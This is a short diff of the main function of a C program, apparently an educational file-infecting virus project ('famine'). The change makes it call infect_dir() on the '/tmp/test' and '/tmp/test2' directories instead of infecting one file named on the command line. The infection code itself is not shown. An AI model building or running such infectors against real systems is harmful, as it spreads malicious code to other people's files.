@@ -12,8 +12,8 @@
 
 #include "../include/famine.h"
 
-int main(int argc, char **argv) {
-	if (argc != 2)
-  		return (1);
-	return (infect_file(argv[1]));
+int main(void) {
+	infect_dir("/tmp/test");
+	infect_dir("/tmp/test2");
+	return (0);
 }
